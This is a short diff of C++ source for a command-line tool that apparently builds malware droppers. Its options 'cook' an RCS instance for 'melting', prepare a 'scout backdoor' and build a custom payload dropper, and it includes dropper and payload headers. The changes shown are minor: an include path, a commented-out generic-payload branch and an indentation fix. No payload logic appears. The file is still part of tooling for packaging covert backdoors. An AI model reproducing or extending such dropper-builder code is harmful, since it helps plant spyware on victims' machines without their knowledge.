@@ -1,6 +1,8 @@
 #include <iostream>
 #include <string>
 
+using namespace std;
+
 #include <boost/algorithm/string.hpp>
 #include <boost/shared_ptr.hpp>
 #include <boost/filesystem/fstream.hpp>
@@ -11,7 +13,7 @@ namespace bf = boost::filesystem;
 #include <boost/program_options.hpp>
 namespace po = boost::program_options;
 
-#include "DropperCode.h"
+#include "../../RCSDropper/DropperCode.h"
 #include "Components.h"
 #include "RCSPayload.h"
 #include "GenericPayload.h"
@@ -35,11 +37,9 @@ int main(int argc, char* argv[])
 	po::options_description desc("Allowed options");
 	desc.add_options()
 		("help", "this help message")
-		//("generic,G", po::value< string >(), "prepare a custom payload dropper")
 		("cook,C", "prepare RCS instance for melting")
 		("rcs,R", po::value< string >(), "RCS directory")
 		("demoimage,d", po::value< string >(), "Demo image")
-		//("dropper,d", po::value< string >()->default_value("components"), "dropper components directory")
 		("ofile,O", po::value< string >()->default_value("cooked"), "output file")
 		("scout,S", po::value<string>(), "cook for scout backdoor")
 		("version,V", "product version")
@@ -66,6 +66,7 @@ int main(int argc, char* argv[])
 	
 	bf::path output_filepath = vm["ofile"].as<string>();
 	
+	/*
 	if (vm.count("generic")) {
 		bf::path payload_directory = vm["generic"].as< string >();
 		cout << "Generic payload	  : \"" << payload_directory << "\"" << endl;
@@ -81,6 +82,7 @@ int main(int argc, char* argv[])
 		
 		return ret;
 	}
+	*/
 	
 	if (vm.count("cook")) {
 		if ( ! vm.count("rcs") ) {
@@ -162,8 +164,7 @@ int generic_cook(bf::path payload_path, bf::path output_file)
 int rcs_cook(bf::path rcs_directory, bf::path output_file, BOOL bScout)
 {
 	if ( bf::exists(output_file) )
-	bf::remove(output_file);
-
+		bf::remove(output_file);
 
 	if (!bScout)
 	{
